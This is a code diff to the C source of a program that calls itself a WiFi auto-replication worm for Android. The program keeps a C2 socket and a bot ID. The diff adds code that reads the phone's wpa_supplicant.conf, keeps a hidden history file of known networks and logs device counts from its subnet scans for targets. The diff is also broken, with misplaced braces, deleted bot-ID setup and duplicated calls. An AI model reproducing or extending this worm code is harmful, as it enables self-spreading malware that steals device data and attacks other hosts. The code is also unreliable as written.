@@ -40,6 +40,18 @@ char current_network[64] = "";
 char my_ip[16];
 int sock_c2 = -1;
 
+// Known networks database (from WiFi history)
+typedef struct {
+    char ssid[64];
+    char subnet[16];
+    time_t last_scanned;
+    int device_count;
+} KnownNetwork;
+
+KnownNetwork known_networks[100];
+int known_network_count = 0;
+pthread_mutex_t networks_mutex = PTHREAD_MUTEX_INITIALIZER;
+
 // ============================================================================
 // NETWORK UTILITIES
 // ============================================================================
@@ -108,6 +120,135 @@ void get_subnet(const char *ip, char *subnet) {
         *(last_dot + 1) = '0';
         *(last_dot + 2) = '\0';
     }
+}
+
+// ============================================================================
+// WIFI HISTORY & KNOWN NETWORKS
+// ============================================================================
+
+// Load WiFi networks from Android config (requires root or readable paths)
+void load_wifi_history() {
+    // Try to read WPA supplicant config
+    FILE *fp = fopen("/data/misc/wifi/wpa_supplicant.conf", "r");
+    if (!fp) {
+        // Fallback to user-accessible location
+        fp = fopen("/sdcard/.wifi_history", "r");
+    }
+    
+    if (!fp) return;
+    
+    char line[256];
+    char current_ssid[64] = "";
+    
+    while (fgets(line, sizeof(line), fp)) {
+        // Parse SSID from wpa_supplicant format
+        if (strstr(line, "ssid=")) {
+            char *ssid_start = strchr(line, '"');
+            if (ssid_start) {
+                ssid_start++;
+                char *ssid_end = strchr(ssid_start, '"');
+                if (ssid_end) {
+                    *ssid_end = '\0';
+                    strncpy(current_ssid, ssid_start, sizeof(current_ssid) - 1);
+                    
+                    // Add to known networks
+                    pthread_mutex_lock(&networks_mutex);
+                    if (known_network_count < 100) {
+                        strncpy(known_networks[known_network_count].ssid, current_ssid, 64);
+                        known_networks[known_network_count].last_scanned = 0;
+                        known_networks[known_network_count].device_count = 0;
+                        known_network_count++;
+                    }
+                    pthread_mutex_unlock(&networks_mutex);
+                }
+            }
+        }
+    }
+    
+    fclose(fp);
+    
+    if (known_network_count > 0) {
+        printf("[+] Loaded %d known WiFi networks from history\n", known_network_count);
+    }
+}
+
+// Save current network info for future reference
+void save_network_info(const char *ssid, const char *subnet, int device_count) {
+    pthread_mutex_lock(&networks_mutex);
+    
+    // Update existing or add new
+    int found = -1;
+    for (int i = 0; i < known_network_count; i++) {
+        if (strcmp(known_networks[i].ssid, ssid) == 0) {
+            found = i;
+            break;
+        }
+    }
+    
+    if (found >= 0) {
+        // Update existing
+        strncpy(known_networks[found].subnet, subnet, 16);
+        known_networks[found].last_scanned = time(NULL);
+        known_networks[found].device_count = device_count;
+    } else if (known_network_count < 100) {
+        // Add new
+        strncpy(known_networks[known_network_count].ssid, ssid, 64);
+        strncpy(known_networks[known_network_count].subnet, subnet, 16);
+        known_networks[known_network_count].last_scanned = time(NULL);
+        known_networks[known_network_count].device_count = device_count;
+        known_network_count++;
+    }
+    
+    pthread_mutex_unlock(&networks_mutex);
+    
+    // Persist to file
+    FILE *fp = fopen("/sdcard/.wifi_history", "w");
+    if (!fp) fp = fopen("/tmp/.wifi_history", "w");
+    if (fp) {
+        fprintf(fp, "# Higurashi WiFi History\n");
+        pthread_mutex_lock(&networks_mutex);
+        for (int i = 0; i < known_network_count; i++) {
+            fprintf(fp, "%s|%s|%ld|%d\n",
+                   known_networks[i].ssid,
+                   known_networks[i].subnet,
+                   known_networks[i].last_scanned,
+                   known_networks[i].device_count);
+        }
+        pthread_mutex_unlock(&networks_mutex);
+        fclose(fp);
+    }
+}
+
+// Show known networks statistics
+void show_network_stats() {
+    pthread_mutex_lock(&networks_mutex);
+    
+    if (known_network_count == 0) {
+        printf("[*] No known networks in database\n");
+        pthread_mutex_unlock(&networks_mutex);
+        return;
+    }
+    
+    printf("\n╔══════════════════════════════════════════════════════════╗\n");
+    printf("║           KNOWN WIFI NETWORKS DATABASE                   ║\n");
+    printf("╠══════════════════════════════════════════════════════════╣\n");
+    
+    for (int i = 0; i < known_network_count; i++) {
+        time_t now = time(NULL);
+        int days_ago = (now - known_networks[i].last_scanned) / 86400;
+        
+        printf("║ %-30s Devices: %-3d", known_networks[i].ssid, known_networks[i].device_count);
+        if (known_networks[i].last_scanned > 0) {
+            printf(" (%dd ago)", days_ago);
+        } else {
+            printf(" (never)  ");
+        }
+        printf(" ║\n");
+    }
+    
+    printf("╚══════════════════════════════════════════════════════════╝\n\n");
+    
+    pthread_mutex_unlock(&networks_mutex);
 }
 
 // ============================================================================
@@ -346,6 +487,8 @@ void scan_local_network() {
     
     printf("[+] Scanning network: %s0/24\n", subnet);
     
+    int initial_peer_count = peer_count;
+    
     pthread_t threads[SCAN_THREADS];
     int ips_per_thread = 254 / SCAN_THREADS;
     
@@ -356,13 +499,17 @@ void scan_local_network() {
         range->end = (t == SCAN_THREADS - 1) ? 254 : (t + 1) * ips_per_thread;
         
         pthread_create(&threads[t], NULL, scan_worker, range);
-    }
-    
     // Wait for all threads
     for (int t = 0; t < SCAN_THREADS; t++) {
         pthread_join(threads[t], NULL);
     }
     
+    int devices_found = peer_count - initial_peer_count;
+    printf("[+] Scan complete. Found %d new devices\n", devices_found);
+    
+    // Save network info
+    save_network_info(current_network, subnet, devices_found);
+}   
     printf("[+] Scan complete. Found %d potential targets\n", peer_count);
 }
 
@@ -512,17 +659,23 @@ int main(int argc, char **argv) {
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
     
-    // Generate bot ID
-    srand(time(NULL) ^ getpid());
-    snprintf(bot_id, sizeof(bot_id), "mob_%08x", rand());
-    
     printf("\n");
     printf("╔══════════════════════════════════════════════════════════╗\n");
     printf("║     HIGURASHI MOBILE - WiFi Auto-Replication Worm        ║\n");
     printf("╚══════════════════════════════════════════════════════════╝\n");
     printf("[*] Bot ID: %s\n", bot_id);
     
+    // Load WiFi history
+    load_wifi_history();
+    
     // Get initial network info
+    get_local_ip();
+    get_current_wifi_ssid(current_network, sizeof(current_network));
+    printf("[*] Current network: %s\n", current_network);
+    printf("[*] Local IP: %s\n", my_ip);
+    
+    // Show known networks
+    show_network_stats();
     get_local_ip();
     get_current_wifi_ssid(current_network, sizeof(current_network));
     printf("[*] Current network: %s\n", current_network);
